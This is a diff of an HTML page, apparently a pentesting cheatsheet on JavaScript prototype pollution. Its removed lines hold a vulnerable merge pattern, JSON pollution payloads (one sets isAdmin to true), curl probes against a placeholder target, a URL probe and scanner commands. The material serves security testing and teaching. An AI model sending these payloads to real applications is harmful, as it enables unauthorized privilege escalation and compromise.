@@ -1,489 +1,73 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WEB15 Prototype Pollution | JinPwn</title><meta name="description" content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/">
-<meta property="og:title" content="WEB15 Prototype Pollution | JinPwn">
-<meta property="og:description" content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="WEB15 Prototype Pollution | JinPwn">
-<meta name="twitter:description" content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"WEB15 Prototype Pollution | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link">File Upload &amp; LFI</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link is-current">WEB15 Prototype Pollution</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>WEB15 Prototype Pollution</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">WEB15 Prototype Pollution</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Web Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link">File Upload &amp; LFI</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link is-current">WEB15 Prototype Pollution</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>JavaScript-specific. Setting <code>__proto__</code> or <code>constructor.prototype</code> properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
-</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
-    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Prototype pollution requires a code pattern like:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;object&#39;</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>   <span class="c1">// recursive - pollutes if source has __proto__
-</span></span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Common surfaces:</p>
-<ul>
-<li>JSON merge / extend / clone helpers (lodash <code>_.merge</code>, jQuery <code>$.extend(true, ...)</code>, deep-extend, deeply)</li>
-<li>Object.assign-like helpers that recursively merge user input</li>
-<li>Express middleware that merges req.body into options</li>
-<li>Query string parsers (qs, querystring, express body parser) - controller actions that take entire object directly into merge</li>
-<li>Configuration loaders that merge user JSON into defaults</li>
-<li>Mongoose pre-save hooks that merge user data</li>
-<li>React/Vue prop merging in libraries</li>
-</ul>
-<p>Two flavors:</p>
-<ul>
-<li><strong>Server-side</strong> (Node.js apps) → RCE via gadget</li>
-<li><strong>Client-side</strong> (any JS in the browser) → XSS via gadget</li>
-</ul>
-<h2 id="ii-server-side-detection" data-heading-permalink="true"><span class="heading-content">ii. Server-side detection</span>
-    <a class="heading-permalink" href="#ii-server-side-detection" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the app accepts JSON, send:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;polluted&#34;</span><span class="p">:</span> <span class="s2">&#34;yes&#34;</span><span class="p">}}</span>
-</span></span></code></pre></div><p>Or for stacked / nested attacks:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;constructor&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;prototype&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;polluted&#34;</span><span class="p">:</span> <span class="s2">&#34;yes&#34;</span><span class="p">}}}</span>
-</span></span></code></pre></div><p>Then make a separate, unrelated request to ANY endpoint that returns JSON. If <code>polluted: &quot;yes&quot;</code> appears in an unrelated response → vuln confirmed.</p>
-<p>Alternative test - pollute a common Node.js HTTP option:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;_method&#34;</span><span class="p">:</span> <span class="s2">&#34;PUT&#34;</span><span class="p">}}</span>
-</span></span></code></pre></div><p>Then make a subsequent request. If Express interprets the method as PUT despite POST → polluted.</p>
-<p>Or check Node.js global flags:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;__proto__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;isAdmin&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">}}</span>
-</span></span></code></pre></div><p>Make a follow-up authenticated request. If isAdmin is now true → polluted.</p>
-<h2 id="iii-server-side-detection-one-liner" data-heading-permalink="true"><span class="heading-content">iii. Server-side detection one-liner</span>
-    <a class="heading-permalink" href="#iii-server-side-detection-one-liner" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Single curl probe + read of any reflected response. Both <code>__proto__</code> and <code>constructor.prototype</code> need testing:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Pollute:</span>
-</span></span><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/users&#34;</span> -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;__proto__&#34;: {&#34;isAdmin&#34;: true}}&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Read back from any endpoint:</span>
-</span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/api/me&#34;</span> <span class="p">|</span> jq
-</span></span><span class="line"><span class="cl"><span class="c1">## isAdmin shows up where it shouldn&#39;t</span>
-</span></span></code></pre></div><p>Some apps need a server restart for the pollution to clear - note this when reporting (persistence model).</p>
-<h2 id="iv-tools" data-heading-permalink="true"><span class="heading-content">iv. Tools</span>
-    <a class="heading-permalink" href="#iv-tools" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="ppmap--ppmap" data-heading-permalink="true"><span class="heading-content">PPMap / ppmap</span>
-    <a class="heading-permalink" href="#ppmap--ppmap" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Detects pollutions on Express-style apps:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/y0giii/Server-Side-Prototype-Pollution-Gadgets
-</span></span><span class="line"><span class="cl"><span class="c1">## Various tools in there for testing common gadgets</span>
-</span></span></code></pre></div><p>The tooling space for server-side PP is still maturing - manual is more reliable than automated tools for now.</p>
-<h3 id="dom-invader-burp-pro" data-heading-permalink="true"><span class="heading-content">DOM Invader (Burp Pro)</span>
-    <a class="heading-permalink" href="#dom-invader-burp-pro" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Best client-side PP detection. Enable in Burp&rsquo;s Chromium → Settings → DOM Invader → Enable Prototype Pollution. Browse the target. DOM Invader reports every controllable source-to-pollution-sink path it sees.</p>
-<h3 id="nuclei--custom-templates" data-heading-permalink="true"><span class="heading-content">nuclei + custom templates</span>
-    <a class="heading-permalink" href="#nuclei--custom-templates" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nuclei -u <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">&#34;</span> -tags pp,prototype
-</span></span></code></pre></div><p>Catches common patterns like the Express body parser merge bugs.</p>
-<h3 id="portswiggers-pp-scanner-burp-pro" data-heading-permalink="true"><span class="heading-content">PortSwigger&rsquo;s PP scanner (Burp Pro)</span>
-    <a class="heading-permalink" href="#portswiggers-pp-scanner-burp-pro" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Active scanner audit phase covers server-side PP.</p>
-<h2 id="v-client-side-prototype-pollution" data-heading-permalink="true"><span class="heading-content">v. Client-side prototype pollution</span>
-    <a class="heading-permalink" href="#v-client-side-prototype-pollution" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>DOM PP happens when client JS does merges with <code>location.hash</code>, <code>location.search</code>, <code>window.name</code>, postMessage data, or any other client-controllable input.</p>
-<p>Probe via URL:</p>
-<pre tabindex="0"><code>https://target.com/#__proto__[polluted]=yes
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>WEB15 Prototype Pollution | JinPwn</title><meta name=description content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client)."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/><meta property="og:title" content="WEB15 Prototype Pollution | JinPwn"><meta property="og:description" content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client)."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="WEB15 Prototype Pollution | JinPwn"><meta name=twitter:description content="JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client)."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"JavaScript-specific. Setting __proto__ or constructor.prototype properties on an object pollutes the prototype of ALL objects of that class. Gadgets in libraries turn that into RCE (server) or XSS (client).","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"WEB15 Prototype Pollution | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web15-prototype-pollution/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Web Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/web/ class=cheatsheet-sidebar-section>Web Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-sidebar-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-sidebar-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-sidebar-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-sidebar-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-sidebar-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-sidebar-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-sidebar-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-sidebar-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-sidebar-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-sidebar-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-sidebar-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-sidebar-link>Web Cache Poisoning</a></li><li><a href=/cheatsheets/web/web12-ssrf/ class=cheatsheet-sidebar-link>SSRF</a></li><li><a href=/cheatsheets/web/web13-file-upload--lfi/ class=cheatsheet-sidebar-link>File Upload & LFI</a></li><li><a href=/cheatsheets/web/web14-deserialization/ class=cheatsheet-sidebar-link>Deserialization</a></li><li><a href=/cheatsheets/web/web15-prototype-pollution/ class="cheatsheet-sidebar-link is-current">WEB15 Prototype Pollution</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>WEB15 Prototype Pollution</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>WEB15 Prototype Pollution</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Web Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/web/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/web/00-web-moc/ class=cheatsheet-mobile-sections-link>Web MOC</a></li><li><a href=/cheatsheets/web/web01-content-discovery/ class=cheatsheet-mobile-sections-link>Content Discovery</a></li><li><a href=/cheatsheets/web/web02-auth--session/ class=cheatsheet-mobile-sections-link>Auth & Session</a></li><li><a href=/cheatsheets/web/web03-sql-injection/ class=cheatsheet-mobile-sections-link>SQL Injection</a></li><li><a href=/cheatsheets/web/web04-nosql-injection/ class=cheatsheet-mobile-sections-link>NoSQL Injection</a></li><li><a href=/cheatsheets/web/web05-command-injection/ class=cheatsheet-mobile-sections-link>Command Injection</a></li><li><a href=/cheatsheets/web/web06-ssti/ class=cheatsheet-mobile-sections-link>SSTI</a></li><li><a href=/cheatsheets/web/web08-xss/ class=cheatsheet-mobile-sections-link>XSS</a></li><li><a href=/cheatsheets/web/web07-xxe/ class=cheatsheet-mobile-sections-link>XXE</a></li><li><a href=/cheatsheets/web/web09-csrf--cors/ class=cheatsheet-mobile-sections-link>WEB09 CSRF & CORS</a></li><li><a href=/cheatsheets/web/web10-request-smuggling/ class=cheatsheet-mobile-sections-link>Request Smuggling</a></li><li><a href=/cheatsheets/web/web11-web-cache-poisoning/ class=cheatsheet-mobile-sections-link>Web 